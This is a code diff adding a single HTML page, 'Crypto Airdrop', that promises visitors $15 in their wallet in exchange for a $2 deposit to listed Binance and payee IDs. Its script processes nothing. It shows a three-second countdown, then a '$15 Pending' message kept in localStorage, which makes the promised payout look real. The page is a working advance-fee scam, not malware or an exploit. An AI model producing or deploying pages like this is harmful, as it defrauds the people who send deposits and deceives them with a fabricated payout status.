@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"> <!-- Prevent zooming -->
+    <title>Crypto Airdrop</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(120deg, #1e3c72, #2a5298);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh; /* Full height */
+            color: #fff;
+            overflow: hidden; /* Prevent scrolling */
+        }
+
+        .container {
+            max-width: 90%;
+            width: 400px; /* Set fixed width for better scaling */
+            margin: auto;
+            padding: 40px;
+            background-color: #222;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            transition: transform 0.3s;
+        }
+
+        .container:hover {
+            transform: scale(1.02);
+        }
+
+        h1 {
+            font-size: 30px;
+            color: #e74c3c;
+            margin-bottom: 20px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        h1::after {
+            content: '';
+            display: block;
+            width: 100px;
+            height: 4px;
+            background: #e74c3c;
+            margin: 10px auto;
+            border-radius: 2px;
+        }
+
+        p {
+            color: #fff;
+            font-size: 18px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 2px solid #444;
+            border-radius: 8px;
+            font-size: 16px;
+            background-color: #333;
+            color: #fff;
+            transition: border-color 0.3s;
+        }
+
+        input[type="text"]:focus {
+            border-color: #e74c3c;
+            outline: none;
+        }
+
+        button {
+            padding: 12px 20px;
+            border: none;
+            border-radius: 8px;
+            background-color: #e74c3c;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.3s;
+            width: 100%;
+        }
+
+        button:disabled {
+            background-color: #95a5a6;
+        }
+
+        button:hover:not(:disabled) {
+            background-color: #c0392b;
+            transform: translateY(-2px);
+        }
+
+        .message {
+            margin-top: 20px;
+            font-size: 16px;
+            color: #fff;
+        }
+
+        .pending {
+            margin-top: 20px;
+            font-size: 18px;
+            color: #e74c3c;
+            font-weight: bold;
+        }
+
+        .countdown {
+            font-size: 22px;
+            color: #f39c12;
+            margin-top: 10px;
+        }
+
+        .footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: #111;
+            color: white;
+            padding: 10px 0;
+            text-align: center;
+            font-size: 16px;
+            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.2);
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Claim Your Free $15!</h1>
+    <p>Deposit $2 and receive $15 in your wallet instantly.</p>
+    <form id="depositForm">
+        <input type="text" id="walletAddress" placeholder="Enter your wallet address" required>
+        <button type="submit">Deposit $2</button>
+    </form>
+    <p class="message">Processing will take 3 seconds.</p>
+    <p class="message">Binance ID: <strong>727837921</strong></p>
+    <p class="message">Payee's ID: <strong>P1105473966</strong></p>
+    <p id="countdown" class="countdown"></p>
+    <p id="result" class="pending"></p>
+</div>
+
+<div class="footer">
+    © 2024 Crypto Airdrop - All Rights Reserved
+</div>
+
+<script>
+    document.addEventListener('DOMContentLoaded', () => {
+        const walletAddressInput = document.getElementById('walletAddress');
+        const result = document.getElementById('result');
+        const storedWalletAddress = localStorage.getItem('walletAddress');
+        const storedPending = localStorage.getItem('pending');
+
+        if (storedWalletAddress) {
+            walletAddressInput.value = storedWalletAddress;
+            walletAddressInput.disabled = true;
+        }
+
+        if (storedPending) {
+            result.textContent = storedPending;
+        }
+
+        document.getElementById('depositForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const walletAddress = walletAddressInput.value;
+            const button = e.target.querySelector('button');
+            const countdown = document.getElementById('countdown');
+            let timeLeft = 3;
+
+            button.disabled = true;
+            walletAddressInput.disabled = true;
+            button.textContent = 'Processing...';
+
+            countdown.textContent = `Please wait: ${timeLeft} seconds`;
+
+            const timer = setInterval(() => {
+                timeLeft--;
+                if (timeLeft > 0) {
+                    countdown.textContent = `Please wait: ${timeLeft} seconds`;
+                } else {
+                    clearInterval(timer);
+                    button.disabled = false;
+                    button.textContent = 'Deposit $2';
+                    countdown.textContent = '';
+                    const pendingText = `Wallet Address: ${walletAddress} - $15 Pending`;
+                    result.textContent = pendingText;
+                    localStorage.setItem('walletAddress', walletAddress);
+                    localStorage.setItem('pending', pendingText);
+                }
+            }, 1000);
+        });
+    });
+</script>
+
+</body>
+</html>
